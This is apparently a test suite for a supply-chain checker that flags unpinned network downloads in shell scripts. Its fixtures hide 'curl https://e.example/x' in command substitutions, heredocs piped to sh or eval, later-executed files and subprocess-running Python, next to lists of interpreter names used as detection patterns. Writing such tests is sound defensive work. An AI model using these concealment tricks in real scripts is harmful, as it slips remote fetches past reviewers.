GO = '/usr/bin/curl -q -fsSL -g --max-filesize 268435456 --max-time 900 --proto =https --tlsv1.2 -o "$tmp/dl/go/$f" "https://go.dev/dl/$f" || die "could not download a Go toolchain from go.dev" 1'
rows = [r for r in json.load(open(sys.argv[1]))["unmeasured_text"] if r["ruling"].startswith(ac.GO_RULING)]
assert len(rows) == 1, [r["line"][:12] for r in rows]
r = rows[0]
assert r["file"] == "bin/refresh-inputs.sh" and r["form"] == "a download" and r["line"] == H(GO) and "count" not in r, r
segs = re.split(r"\s*(?:;|&&|\|\||\|)\s*", GO)
assert r["key"] == H(segs[0]) and segs[0].startswith("/usr/bin/curl ") and r["key"] != H(segs[1]) and segs[1].startswith("die "), r
assert ac._live_fetch_line_ok(GO, toolchain=True), "the Go rule refuses the line"
assert not ac._live_fetch_line_ok(GO), "the Wolfi rule accepts a go.dev line"
assert not ac._live_fetch_line_ok(GO.replace("/usr/bin/curl", "/usr/bin/other", 1), toolchain=True), "another program is accepted"
assert not ac._live_fetch_line_ok(GO.replace("https://go.dev/", "https://go.dev.example/", 1), toolchain=True), "another host is accepted"
PY
CASE="a committed loopback row is exactly the one pinned line of bin/loopback-get.sh (file, form, no count, no context, the pinned whole-line hash) and there is at most one"
check python3 - "$root/.github/supply-chain-exceptions.json" "$chk" <<'PY'
import importlib.util, json, sys
spec = importlib.util.spec_from_file_location("ac", sys.argv[2]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
rows = [r for r in json.load(open(sys.argv[1]))["unmeasured_text"] if r["ruling"].startswith(ac.LOOPBACK_RULING)]
assert len(rows) <= 1, len(rows)
for r in rows:
    assert r["file"] == ac.LOOPBACK_FILE and r["form"] == "a download" and r["line"] == ac.LOOPBACK_LINE_SHA256 and "count" not in r and "context" not in r, r
PY
CASE="every committed pinned-fetch row names one of the nineteen pinned lines of its own file (its form, its whole-line hash), with no count and no context"
check python3 - "$root/.github/supply-chain-exceptions.json" "$chk" <<'PY'
import importlib.util, json, sys
spec = importlib.util.spec_from_file_location("ac", sys.argv[2]); ac = importlib.util.module_from_spec(spec); sys.modules["ac"] = ac; spec.loader.exec_module(ac)
rows = [r for r in json.load(open(sys.argv[1]))["unmeasured_text"] if r["ruling"].startswith(ac.PINNED_FETCH_RULING)]
assert len({(r["file"], r["line"]) for r in rows}) <= 19, len(rows)   # one row per command segment of a line: a line with two segments (acceptance-k8s.sh) has two rows
assert len(rows) <= 20, len(rows)
for r in rows:
    assert r["line"] in ac._PINNED_FETCH_SHA.get(r["file"], {}) and r["form"] in ("a download", "a gh release or extension download") and "count" not in r and "context" not in r, r
PY
CASE="the committed pinned-fetch rows are EXACTLY the scanner's occurrences of the nineteen pinned lines: each row's file, form, key and whole-line hash is one the scan produces for its line, none is missing, none is extra (twenty rows)"
check python3 - "$root/.github/supply-chain-exceptions.json" "$chk" <<'PY'
import hashlib, importlib.util, json, sys
spec = importlib.util.spec_from_file_location("ac", sys.argv[2]); ac = importlib.util.module_from_spec(spec); sys.modules["ac"] = ac; spec.loader.exec_module(ac)
# the oracle is not taken from the checker alone: for each file, the sha256 of each pinned line (whitespace collapsed, as the scan hashes a line) is written here once, so a change, a swap between files, an addition or a removal in the checker's table alone fails this test (REQ-SUP-001-AC26: 1 release download, 1 client image, 14 loopback requests in four acceptance scripts, 3 Go fetches)
EXPECTED = {
    "bin/release-assets.sh": [
        "310e8130d53cf46f5d3cde34273658ff6d8a1eaab5a7e86c9244f4d4a9023fe5",
    ],
    "bin/acceptance-k8s.sh": [
        "72bfaad46b088a7a39da93c083a8327473c5aee27d69878aeb0ce100134c6816",
    ],
    "bin/acceptance-gradle.sh": [
        "59793d05534371e9074f94050a6cb3ffdcc5b22477999f8d05abd4c4f73a33dc",
        "85d58dc5457660a946aa5e3aa99ad7bd8518cdf8571d542647b3dc2d0a48ee23",
        "d104f7480fdfddf1771f2b53803ff0c0d7d3d8bb56dcabf5b33c0e83c7b64bb2",
    ],
    "bin/acceptance-gradle-capped.sh": [
        "1e719ae863a1d1da34ce4b288dfc584be423a6549b1a65e47bdd900b1feeb5d7",
        "868738b70b28a04197b6a34e1150375a1fe2ffe1449bb68fefbc071ea244032e",
        "cc171056ca9b17d70a97e8823cf1c30d19d4e17d56a13655c4b54eac0ecd0bee",
        "cd429412808e6f44d24e8b6f9698a9ae401430eb8df4505121040a27ac75f314",
    ],
    "bin/acceptance-maven.sh": [
        "745877cb813e6de69e1c4f371e860f7965339dfdff9601a72b62c42697fe3a2c",
        "8694e7cf27a55609cd6f8ad4f85430759b9e406d164b97e5d632c6dce834c798",
        "f002505192d0fa92eb33f53dcc46343fa1d35b2495da122c48fb6722adb81f64",
        "f9845b6412f4b59212b81e4a43d2059a14e2a08849261a7f1f93f008d4df137d",
    ],
    "bin/acceptance-maven-capped.sh": [
        "4beb1efe2b83eada2f2156256abc0b376600cbdffb30fbe450f2ab77ed0aa242",
        "6d9cfda4fd54780de4d518cc04f4595e779d074ad30832bd4c0e10e887250542",
        "d13281784b28c886b6b617792b2ebbd24d341f2d1629bc89ff6d54fa878906d7",
    ],
    "bin/install-scanner.sh": [
        "1714fe6f02ca5bb0e5e7caeb04be023d96f15dfbd67448f45b86683a82e3e08f",
    ],
    "bin/go-bump-open-pr.sh": [
        "122789dd18ce1f7e0c9d9e34f02d10435f6ba715ccc666bd8a8409e44da163f4",
        "33cb527c703c825a14170872548ce54e176df30ca86f7e86eac54a823e885320",
    ],
}
assert {f: sorted(hashlib.sha256(" ".join(l.split()).encode("utf-8", "replace")).hexdigest() for l in ls) for f, ls in ac.PINNED_FETCH.items()} == EXPECTED
want = set()
for f, lines in ac.PINNED_FETCH.items():
    for l in lines:
        for k, flat, bashlike in ac.inv.unmeasured_occurrences({f: l + "\n"}):
            assert bashlike, l
            want.add((k[0], k[1], k[2].split(":", 1)[0], ac._line_hash(flat)))   # the row key is the hash of the download segment (the part of the scan key before the colon)
rows = [r for r in json.load(open(sys.argv[1]))["unmeasured_text"] if r["ruling"].startswith(ac.PINNED_FETCH_RULING)]
have = [(r["file"], r["form"], r["key"], r["line"]) for r in rows]
assert len(have) == len(set(have)) == len(want) == 20, (len(have), len(set(have)), len(want))
assert set(have) == want, sorted(set(have) ^ want)
PY
# a row the PULL REQUEST brings does nothing: the rulings are read from the base branch (the trusted checkout the script runs from), never from --root
rtrows "$work/rt" "$work/rt-head.json" all
newcase rthead "$(pyw bin/ruled.sh "$rtext")"$'\n'"import shutil; shutil.copy('$work/rt-head.json', '.github/supply-chain-exceptions.json')"
rc=0; python3 "$chk" --root "$work/rthead" --base HEAD~1 --head HEAD >"$work/rt.out" 2>&1 || rc=$?
CASE="AC16: rows that only the pull request adds (its own .github/supply-chain-exceptions.json) are never read: both lines fail (exit 1)"
check test "$rc" -eq 1; check test "$(grep -c 'FAIL unmeasured' "$work/rt.out")" -eq 2
mkdir -p "$work/trusted-gh/agent"; cp -R "$here/../supply-chain" "$work/trusted-gh/agent/supply-chain"
git -C "$work/rthead" show HEAD:.github/supply-chain-exceptions.json >"$work/trusted-gh/supply-chain-exceptions.json"; rc=0
python3 "$work/trusted-gh/agent/supply-chain/pin-age-check.py" --root "$work/rthead" --base HEAD~1 --head HEAD >"$work/rt.out" 2>&1 || rc=$?
CASE="AC16: the default rulings file is the one beside the checkout the script runs from (CI: trusted/.github/supply-chain-exceptions.json): the same rows there pass (exit 0)"
check test "$rc" -eq 0; check test "$(grep -c 'ruled text' "$work/rt.out")" -eq 2
rm -rf "$work/trusted-gh"
CASE="AC16: the default rulings path is the script's own checkout (.github/supply-chain-exceptions.json beside .github/agent), whatever --root says"
check python3 - "$chk" "$root" <<'PY'
import importlib.util, os, sys
spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
assert os.path.realpath(ac.DEFAULT_EXCEPTIONS) == os.path.realpath(os.path.join(sys.argv[2], ".github", "supply-chain-exceptions.json")), ac.DEFAULT_EXCEPTIONS
PY
CASE="the committed build-container install row is exactly the one apk line of bin/acceptance-egress.sh (file, form, key and line equal the hash of the whole line, no count, no context) and there is at most one; the line sits in a container whose image is pinned by digest"
check python3 - "$root/.github/supply-chain-exceptions.json" "$root/bin/acceptance-egress.sh" <<'PY'
import hashlib, json, os, re, sys
rows = [r for r in json.load(open(sys.argv[1]))["unmeasured_text"] if r["ruling"].startswith("build-container install, advisor reading Oct 19: ")]
assert len(rows) <= 1, rows
line = "apk add --no-cache build-base linux-headers xz >/dev/null"
h = hashlib.sha256(line.encode()).hexdigest()
for r in rows:
    assert r["file"] == "bin/acceptance-egress.sh" and r["form"] == "a system package install" and r["key"] == r["line"] == h and "count" not in r and "context" not in r, r
    if os.path.exists(sys.argv[2]):      # the file arrives with the release chain (not on every branch): where it is present, the line is in it once and the container that runs it is a digest-pinned image
        src = open(sys.argv[2]).read()
        assert src.count(line) == 1, "the apk line is not in the file exactly once"
        pre = src.split(line)[0].rsplit("docker run", 1)[1]
        assert re.search(r"alpine:[0-9.]+@sha256:[0-9a-f]{64}", pre), "the image of the container is not pinned by digest"
PY
CASE="AC16: the committed unmeasured_text rows load, and each has exactly file, form, key and line (16 lowercase hex each) and at most a count, a 'text, not a command:' or 'harness assertion:' ruling and no duplicate"
check python3 - "$chk" "$root/.github/supply-chain-exceptions.json" <<'PY'
import importlib.util, json, re, sys
spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
allrows = json.load(open(sys.argv[2]))["unmeasured_text"]
loaded = ac.load_ruled_text(sys.argv[2], required=True)
assert allrows and len(loaded) == len(allrows), (len(allrows), len(loaded))
calls = [r for r in allrows if r["form"] == "a local reusable workflow call"]    # REQ-SUP-001-AC19: rows that name an item (its whole-identity hash), ruled by the orchestrator
for r in calls:
    assert r["key"] == r["line"] and re.fullmatch(r"[0-9a-f]{64}", r["key"]) and r["file"].startswith(".github/workflows/") and r["ruling"].startswith("local reusable workflow call; "), r
rows = [r for r in allrows if r["form"] != "a local reusable workflow call"]
forms = {"a download", ac.UNPINNED_FORM} | {w for _, w in ac.inv._UNMEASURED}
for r in rows:
    assert set(r) - {"count", "context", "proof"} == {"file", "form", "key", "line", "ruling"} and (type(r.get("count", 1)) is int and 1 <= r.get("count", 1) <= 100), r
    assert ("proof" not in r or "context" in r) and r.get("context", "comment") in ac.CONTEXTS and (r.get("proof", "x").strip() != "" and type(r.get("proof", "x")) is str), r
    assert re.fullmatch(r"[0-9a-f]{64}", r["line"]), r
    assert r["file"] and not r["file"].startswith((".github/agent/", "/")) and r["form"] in forms, r
    pre = next((x for x in ("text, not a command: ", "harness assertion: ", ac.LIVE_RULING, ac.GO_RULING, ac.LOOPBACK_RULING, ac.PINNED_FETCH_RULING, "build-container install, advisor reading Oct 19: ") if r["ruling"].startswith(x)), None)
    assert re.fullmatch(r"[0-9a-f]{64}", r["key"]) and pre and len(r["ruling"]) > len(pre) + 10, r
PY

# --- REQ-SUP-001-AC16, the optional row field `context` (advisor, Oct 16; owner's plain-forms rule): a ruled row may carry context = comment | assignment | heredoc |
# pystring, and proof (a text). A row WITH a context rules its line ONLY when the checker proves the context from the head file at scan time; otherwise the row rules
# NOTHING (it never falls back to the old behaviour). A context only ever NARROWS. Rows without a context behave exactly as before (every case above). -------------
ctxrun() { # NAME CONTENT CONTEXT [PROOF] -> rc, $work/ctx.out: bin/ctx.sh = CONTENT in the head commit; every row comes from the REAL scan and carries the context
  newcase "$1" "$(pyw bin/ctx.sh "$2")"
  rtrows "$work/$1" "$work/ctx-$1.tmp.json" all
  python3 - "$work/ctx-$1.tmp.json" "$work/ctx-$1.json" "$3" "${4:-}" <<'PY'
import json, sys
src, out, ctx, proof = sys.argv[1:5]
d = json.load(open(src))
assert d["unmeasured_text"], "the fixture produced no unmeasured line"
for r in d["unmeasured_text"]:
    if ctx: r["context"] = ctx
    if proof: r["proof"] = proof
json.dump(d, open(out, "w"))
PY
  rc=0; python3 "$chk" --root "$work/$1" --base HEAD~1 --head HEAD --json "$work/ctx.json" --exceptions "$work/ctx-$1.json" >"$work/ctx.out" 2>&1 || rc=$?
}
ctxyes() { ctxrun n "$2" "$3" "${4:-}"; CASE="AC16 context $3: $1: ruled (exit 0)"; check test "$rc" -eq 0; check grep -q 'ruled text' "$work/ctx.out"; }
ctxno()  { ctxrun n "$2" "$3" "${4:-}"; CASE="AC16 context $3: $1: rules NOTHING (exit 1, the line fails as unmeasured)"; check test "$rc" -eq 1; check grep -q 'FAIL unmeasured:bin/ctx.sh' "$work/ctx.out"; }
SH=$'#!/bin/sh\n'
# comment
ctxyes "a comment line" "$SH# curl https://e.example/x"$'\n' comment
ctxno "code that mentions curl" "${SH}echo curl https://e.example/x"$'\n' comment
ctxno "a trailing comment after code" "${SH}true # curl https://e.example/x"$'\n' comment
ctxno "a comment line joined to the line before by a continuation" "${SH}true \\"$'\n'"# curl https://e.example/x"$'\n' comment
# assignment
ctxno "an integer variable evaluates its assignment as arithmetic" "${SH}"$'declare -i N\nN=\'a[$(curl https://e.example/x)]\'\n' assignment
ctxno "typeset -i likewise" "${SH}"$'typeset -i N\nN=\'a[$(curl https://e.example/x)]\'\n' assignment
ctxno "local -i likewise" "${SH}"$'f() { local -i N; N=\'a[$(curl https://e.example/x)]\'; }\n' assignment
ctxyes "one plain double-quoted assignment" "${SH}CASE=\"mentions curl https://e.example/x\""$'\n' assignment
ctxyes "one plain single-quoted assignment" "${SH}CASE='mentions curl https://e.example/x'"$'\n' assignment
ctxyes ">( or <( written inside double quotes is text" "${SH}CASE=\"a <r>(.git) <(x) curl https://e.example/x\""$'\n' assignment
ctxyes "a dollar-paren inside SINGLE quotes is text" "${SH}CASE='a \$(x) curl https://e.example/x'"$'\n' assignment
ctxno "a dollar-paren inside DOUBLE quotes still runs" "${SH}CASE=\"a \$(x) curl https://e.example/x\""$'\n' assignment
ctxno "backticks inside DOUBLE quotes still run" "${SH}CASE=\"a \`x\` curl https://e.example/x\""$'\n' assignment
ctxno "an unquoted process substitution in the value" "${SH}CASE=a<(x)curl"$'\n' assignment
ctxno "a command substitution" "${SH}X=\$(curl https://e.example/x)"$'\n' assignment
ctxno "backticks" "${SH}X=\`curl https://e.example/x\`"$'\n' assignment
ctxno "a substitution inside a default" "${SH}X=\"\${Y:-\$(curl https://e.example/x)}\""$'\n' assignment
ctxno "an arithmetic or process substitution" "${SH}X=<(curl https://e.example/x)"$'\n' assignment
ctxno "a second command after a semicolon" "${SH}X=a; curl https://e.example/x"$'\n' assignment
ctxno "an environment prefix that runs the program" "${SH}X=a curl https://e.example/x"$'\n' assignment
ctxno "an unterminated quote" "${SH}X=\"curl https://e.example/x"$'\n' assignment
ctxno "not an assignment at all" "${SH}echo \"curl https://e.example/x\""$'\n' assignment
# heredoc (the opener is not an interpreter)
HD=$'cat >"$d/f" <<\'EOF\'\ncurl https://e.example/x\nEOF\n'
ctxyes "a quoted-delimiter heredoc fed to cat" "$SH$HD" heredoc
ctxyes "a double-quoted delimiter" "${SH}"$'cat <<"EOF"\ncurl https://e.example/x\nEOF\n' heredoc
ctxyes "a backslash delimiter" "${SH}"$'cat <<\\EOF\ncurl https://e.example/x\nEOF\n' heredoc
ctxyes "<<- with a tab-indented terminator" "${SH}"$'cat <<-\'EOF\'\n\tcurl https://e.example/x\n\tEOF\n' heredoc
ctxno "an UNQUOTED delimiter (the shell expands the body)" "${SH}"$'cat <<EOF\ncurl https://e.example/x\nEOF\n' heredoc
ctxyes "a here-string earlier in the script does not hide a later heredoc" "${SH}"$'cat <<<"not a heredoc"\ncat <<\'EOF\'\ncurl https://e.example/x\nEOF\n' heredoc
ctxno "a here-string is not a heredoc (the line after it is plain code)" "${SH}"$'cat <<<"x"\ncurl https://e.example/x\n' heredoc
ctxno "a shift in arithmetic is not a heredoc (the line after it is plain code)" "${SH}"$'x=$((1<<2))\ncurl https://e.example/x\n' heredoc
ctxno "a heredoc operator inside quotes is not a heredoc (the line after it is plain code)" "${SH}"$'echo "cat <<\'EOF\'"\ncurl https://e.example/x\n' heredoc
ctxno "a heredoc operator in a comment is not a heredoc (the line after it is plain code)" "${SH}"$'true # cat <<\'EOF\'\ncurl https://e.example/x\n' heredoc
ctxno "the line after the terminator (outside the heredoc)" "${SH}"$'cat <<\'EOF\'\nok\nEOF\ncurl https://e.example/x\n' heredoc
ctxno "a heredoc with no terminator" "${SH}"$'cat <<\'EOF\'\ncurl https://e.example/x\n' heredoc
for op in "bash" "sh" "dash" "zsh" "ksh" "ash" "eval" "source /dev/stdin" ". /dev/stdin" "xargs -I{} echo" "exec cat" "python3 -" "python -" "node" "perl" "ruby" "awk -f -" "cat | sh" "cat | bash -s" "env bash" "sudo sh"; do
  ctxno "a heredoc whose command line names '$op'" "${SH}$op <<'EOF'"$'\ncurl https://e.example/x\nEOF\n' heredoc
done
ctxno "a heredoc inside a command substitution" "${SH}x=\$(cat <<'EOF'"$'\ncurl https://e.example/x\nEOF\n)\n' heredoc
ctxno "a heredoc opened by a shell function the file defines" "${SH}runit() { sh; }"$'\nrunit <<\'EOF\'\ncurl https://e.example/x\nEOF\n' heredoc
for use in 'bash "$d/x.sh"' 'sh "$d/x.sh"' 'source "$d/x.sh"' '. "$d/x.sh"' 'chmod +x "$d/x.sh"' '"$d/x.sh"' 'python3 "$d/x.sh"' 'exec "$d/x.sh"' 'chmod 755 "$d/x.sh"'; do
  ctxno "the heredoc is written to a file that is later used as: $use" "${SH}"$'cat >"$d/x.sh" <<\'EOF\'\ncurl https://e.example/x\nEOF\n'"$use"$'\n' heredoc
done
ctxyes "the written file is only read (cat) later" "${SH}"$'cat >"$d/x.sh" <<\'EOF\'\ncurl https://e.example/x\nEOF\ncat "$d/x.sh"\n' heredoc
# pystring: the line lies in a Python program run from a quoted heredoc, only inside string constants or comments, and the program never executes a string
PY=$'python3 - <<\'PY\'\nx = ["curl https://e.example/x"]\nprint(x)\nPY\n'
ctxyes "a pure program, the text in a string" "$SH$PY" pystring
ctxyes "a pure program: the word eval only inside a string" "${SH}"$'python3 - <<\'PY\'\nx = ["eval \'curl https://e.example/x\'"]\nPY\n' pystring
ctxyes "a pure program: a multi-line triple-quoted string" "${SH}"$'python3 - <<\'PY\'\nx = """\ncurl https://e.example/x\n"""\nPY\n' pystring
ctxyes "a pure program: the text in a comment" "${SH}"$'python3 - <<\'PY\'\n# curl https://e.example/x\nPY\n' pystring
ctxyes "a pure program with a stdin argument and the reviewed wrapper definition" "${SH}"$'check() { "$@" >/dev/null; }\ncheck python3 - "$a" <<\'PY\'\nx = "curl https://e.example/x"\nPY\n' pystring
ctxno "the wrapper defined differently is not a reviewed line" "${SH}"$'check() { "$@" >/dev/null; sh; }\ncheck python3 - "$a" <<\'PY\'\nx = "curl https://e.example/x"\nPY\n' pystring
ctxyes "environment assignments and a redirection around the python opener" "${SH}"$'A="$B" python3 - "$x" >"$d/o.json" <<\'PY\'\nx = "curl https://e.example/x"\nPY\ncat "$d/o.json"\n' pystring
ctxno "a command substitution in an opener argument" "${SH}"$'python3 - "$(id)" <<\'PY\'\nx = "curl https://e.example/x"\nPY\n' pystring
ctxno "an opener that runs on after the operator (|| list)" "${SH}"$'python3 - <<\'PY\' || { echo no; exit 3; }\nx = "curl https://e.example/x"\nPY\n' pystring
ctxno "the same wrapper when the file does not define it (an unknown command)" "${SH}"$'check python3 - "$a" <<\'PY\'\nx = "curl https://e.example/x"\nPY\n' pystring
ctxno "the same wrapper when it runs a shell" "${SH}"$'check() { sh -c "$@"; }\ncheck python3 - "$a" <<\'PY\'\nx = "curl https://e.example/x"\nPY\n' pystring
ctxno "the command text in code position (a name wget)" "${SH}"$'python3 - <<\'PY\'\nwget = 1  # curl https://e.example/x\nPY\n' pystring
ctxno "a program that is not valid Python" "${SH}"$'python3 - <<\'PY\'\nthis is not python curl https://e.example/x\nPY\n' pystring
ctxno "an unquoted delimiter" "${SH}"$'python3 - <<PY\nx = "curl https://e.example/x"\nPY\n' pystring
ctxno "python -c with the heredoc as stdin data" "${SH}"$'python3 -c "import sys; exec(sys.stdin.read())" <<\'PY\'\nx = "curl https://e.example/x"\nPY\n' pystring
ctxno "a shell as the opener" "${SH}"$'bash - <<\'PY\'\nx = "curl https://e.example/x"\nPY\n' pystring
ctxno "the program's output piped to a shell" "${SH}"$'python3 - <<\'PY\' | sh\nx = "curl https://e.example/x"\nPY\n' pystring
ctxno "the program's output substituted" "${SH}"$'eval "$(python3 - <<\'PY\'\nx = "curl https://e.example/x"\nPY\n)"\n' pystring
ctxno "a line outside the program" "${SH}"$'python3 - <<\'PY\'\nx = 1\nPY\ncurl https://e.example/x\n' pystring
for use in 'bash "$d/g.sh"' 'source "$d/g.sh"' '. "$d/g.sh"' 'chmod +x "$d/g.sh"' '"$d/g.sh"' 'python3 "$d/g.sh"'; do
  ctxno "the program's output file is later used as: $use" "${SH}"$'python3 - >"$d/g.sh" <<\'PY\'\nprint("curl https://e.example/x")\nPY\n'"$use"$'\n' pystring
done
ctxyes "the program's output file is only read later" "${SH}"$'python3 - >"$d/g.json" <<\'PY\'\nprint("curl https://e.example/x")\nPY\ncat "$d/g.json"\n' pystring
# an impure program (it can run something): refused unless the row says honestly that it rests on review
IMP="ast-strings-only; program runs subprocess; read-only use attested by review"
for imp in 'import subprocess' 'from subprocess import run' 'import os; os.system("true")' 'import os; os.popen("true")' 'import os; os.execv("/bin/true", [])' 'exec("1")' 'eval("1")' 'compile("1", "x", "exec")' '__import__("os")' 'import importlib' 'import pty; pty.spawn("true")' 'getattr(object, "x", None)'; do
  ctxno "an impure program ($imp) with no honest proof label" "${SH}"$'python3 - <<\'PY\'\n'"$imp"$'\nx = "curl https://e.example/x"\nPY\n' pystring
  ctxyes "the same impure program ($imp) with the review-attested label" "${SH}"$'python3 - <<\'PY\'\n'"$imp"$'\nx = "curl https://e.example/x"\nPY\n' pystring "$IMP"
done
ctxno "an impure program whose label does not say it rests on review" "${SH}"$'python3 - <<\'PY\'\nimport subprocess\nx = "curl https://e.example/x"\nPY\n' pystring "ast-strings-only"
ctxno "an impure program: the command text in code position even with the label" "${SH}"$'python3 - <<\'PY\'\nimport subprocess\nwget = 1  # curl https://e.example/x\nPY\n' pystring "$IMP"
# --- round 1 of the review of the context field (both seats): lexical state for comment/assignment, accurate quote removal, versioned interpreters, function forms,
# attached redirections, continued openers, file aliases, more Python writes, f-string expressions, rows of other forms, and a ruled line that MOVES out of its context ---
ctxno "a comment-looking line inside a multi-line double-quoted string" "${SH}"$'printf \'%s\\n\' "\n# $(curl https://e.example/x)\n"\n' comment
ctxno "an assignment-looking line inside a multi-line double-quoted string" "${SH}"$'printf \'%s\\n\' "\nX=\'$(curl https://e.example/x)\'\n"\n' assignment
ctxno "a comment inside an UNQUOTED heredoc (the shell expands the body)" "${SH}"$'cat <<EOF\n# $(curl https://e.example/x)\nEOF\n' comment
ctxno "an assignment inside an UNQUOTED heredoc" "${SH}"$'cat <<EOF\nX=\'$(curl https://e.example/x)\'\nEOF\n' assignment
ctxyes "an assignment inside a QUOTED heredoc is text" "${SH}"$'cat <<\'EOF\'\nX=\'$(curl https://e.example/x)\'\nEOF\n' assignment
ctxyes "a comment inside a QUOTED heredoc is text" "${SH}"$'cat <<\'EOF\'\n# $(curl https://e.example/x)\nEOF\n' comment
ctxno "a comment inside a single-quoted multi-line string passed on" "${SH}"$'sh -c \'\n# curl https://e.example/x\n\'\n' comment
ctxno "a delimiter spelled with a literal quote inside another quote ends at that text" "${SH}"$'cat <<\'A"B\'\ntext\nA"B\ncurl https://e.example/x\nAB\n' heredoc
ctxyes "a delimiter with a quote inside another quote, terminated as the shell does" "${SH}"$'cat <<\'A"B\'\ncurl https://e.example/x\nA"B\n' heredoc
for op in "python3.11 -" "python3.12" "python2.7" "perl5.36" "ruby3.2" "bash5" "sh.exe"; do
  ctxno "a heredoc opened by the versioned interpreter '$op'" "${SH}$op <<'EOF'"$'\ncurl https://e.example/x\nEOF\n' heredoc
done
ctxyes "pystring with a versioned python" "${SH}"$'python3.11 - <<\'PY\'\nx = "curl https://e.example/x"\nPY\n' pystring
ctxno "a heredoc opened by a 'function name { }' consumer (no parentheses)" "${SH}"$'function consume { sh; }\nconsume <<\'EOF\'\ncurl https://e.example/x\nEOF\n' heredoc
ctxno "a heredoc opened by a function that calls a function that runs a shell" "${SH}"$'consume() { relay; }\nrelay() { sh; }\nconsume <<\'EOF\'\ncurl https://e.example/x\nEOF\n' heredoc
ctxno "a heredoc opened by a function whose body is on the next line" "${SH}"$'consume()\n{\n  bash\n}\nconsume <<\'EOF\'\ncurl https://e.example/x\nEOF\n' heredoc
ctxno "an attached redirection (cat>file) whose file is later run" "${SH}"$'cat>"$d/x.sh" <<\'EOF\'\ncurl https://e.example/x\nEOF\nsh "$d/x.sh"\n' heredoc
ctxno "an attached append redirection (cat>>file) whose file is later run" "${SH}"$'cat>>"$d/x.sh" <<\'EOF\'\ncurl https://e.example/x\nEOF\nbash "$d/x.sh"\n' heredoc
ctxno "an opener continued onto the next line after the operator (| sh)" "${SH}"$'cat <<\'EOF\' \\\n  | sh\ncurl https://e.example/x\nEOF\n' heredoc
ctxno "the written file is run through a variable that holds its name" "${SH}"$'cat >payload <<\'EOF\'\ncurl https://e.example/x\nEOF\nf=payload\nsh "$f"\n' heredoc
ctxno "the written file is run through a variable (braces) that holds its name" "${SH}"$'cat >"$d/p.sh" <<\'EOF\'\ncurl https://e.example/x\nEOF\nf="$d/p.sh"\nsource ${f}\n' heredoc
ctxyes "the written file is held in a variable and only read" "${SH}"$'cat >payload <<\'EOF\'\ncurl https://e.example/x\nEOF\nf=payload\ncat "$f"\n' heredoc
for imp in 'from pathlib import Path; Path("o").open("w").write("x")' 'import io; io.open("o", "w")' 'from pathlib import Path; Path("o").touch()' 'import os; os.mkdir("o")' 'import os; os.makedirs("o")' 'import os; os.remove("o")' 'import os; os.rename("a", "b")' 'import sys; sys.stdout.write("x")' 'from pathlib import Path; Path("o").mkdir()' 'import os; os.symlink("a", "b")'; do
  ctxno "a program ($imp) that writes or changes files with no review label" "${SH}"$'python3 - <<\'PY\'\n'"$imp"$'\nx = "curl https://e.example/x"\nPY\n' pystring
  ctxyes "the same program ($imp) with the review-attested label" "${SH}"$'python3 - <<\'PY\'\n'"$imp"$'\nx = "curl https://e.example/x"\nPY\n' pystring "$IMP"
done
ctxno "an f-string whose expression holds the downloader word (even with the review label)" "${SH}"$'python3 - <<\'PY\'\nimport subprocess\nprint(f\'{curl}\')\nPY\n' pystring "$IMP"
ctxno "an f-string expression that calls a function named wget" "${SH}"$'python3 - <<\'PY\'\nx = f"{wget()}"\nPY\n' pystring
if python3 -c 'import sys; sys.exit(0 if sys.version_info >= (3, 12) else 1)'; then
  ctxyes "an f-string whose literal part holds the downloader text (Python 3.12 splits f-strings)" "${SH}"$'python3 - <<\'PY\'\nv = 1\nx = f"curl https://e.example/x {v}"\nPY\n' pystring
else
  ctxno "an f-string on a Python whose tokenizer does not split f-strings is refused (fail closed)" "${SH}"$'python3 - <<\'PY\'\nv = 1\nx = f"curl https://e.example/x {v}"\nPY\n' pystring
fi
# a context row of the local-call form is malformed (exit 2): those rows name an item, and their check does not take a context
python3 - "$chk" <<'PY' >/dev/null 2>&1 && ok "AC16 context: a local-call row that carries a context or proof is malformed (RuntimeError, exit 2)" || bad "AC16 context: a local-call row that carries a context or proof is malformed (RuntimeError, exit 2)"
import importlib.util, json, sys, tempfile
spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
h = "a" * 64
for extra in ({"context": "comment"}, {"context": "comment", "proof": "x"}):
    row = dict({"file": ".github/workflows/x.yml", "form": ac.LOCAL_CALL_FORM, "key": h, "line": h, "ruling": "local reusable workflow call; test"}, **extra)
    with tempfile.NamedTemporaryFile("w", suffix=".json") as f:
        json.dump({"unmeasured_text": [row]}, f); f.flush()
        try:
            ac.load_ruled_text(f.name, required=True)
        except RuntimeError:
            continue
        raise SystemExit("accepted")
PY
# a ruled line that was inside its context in the base and has MOVED out of it in the head (its count is unchanged, so it is not "added"): refused
ctxmove() { # NAME BASE-CONTENT HEAD-CONTENT CONTEXT -> rc
  newcase "$1-scan" "$(pyw bin/ctx.sh "$2")"; rtrows "$work/$1-scan" "$work/ctx-$1.tmp.json" all
  python3 - "$work/ctx-$1.tmp.json" "$work/ctx-$1.json" "$4" <<'PY'
import json, sys
d = json.load(open(sys.argv[1]))
for r in d["unmeasured_text"]: r["context"] = sys.argv[3]
json.dump(d, open(sys.argv[2], "w"))
PY
  rm -rf "$work/$1"; cp -R "$base" "$work/$1"
  ( cd "$work/$1" && python3 -c "import pathlib,sys; pathlib.Path('bin/ctx.sh').write_text(sys.argv[1])" "$2" && git add -A && git -c user.name=t -c user.email=t@x commit -q -m b0 \
    && python3 -c "import pathlib,sys; pathlib.Path('bin/ctx.sh').write_text(sys.argv[1])" "$3" && git add -A && git -c user.name=t -c user.email=t@x commit -q -m h0 )
  rc=0; python3 "$chk" --root "$work/$1" --base HEAD~1 --head HEAD --json "$work/ctx.json" --exceptions "$work/ctx-$1.json" >"$work/ctx.out" 2>&1 || rc=$?
}
ctxmove mv1 "${SH}"$'cat <<\'EOF\'\ncurl https://e.example/x\nEOF\n' "${SH}"$'cat <<\'EOF\'\nEOF\ncurl https://e.example/x\n' heredoc
CASE="AC16 context: a ruled heredoc line that MOVES out of the heredoc (same count) is refused (exit 1)"; check test "$rc" -eq 1; check grep -q 'FAIL unmeasured:bin/ctx.sh' "$work/ctx.out"
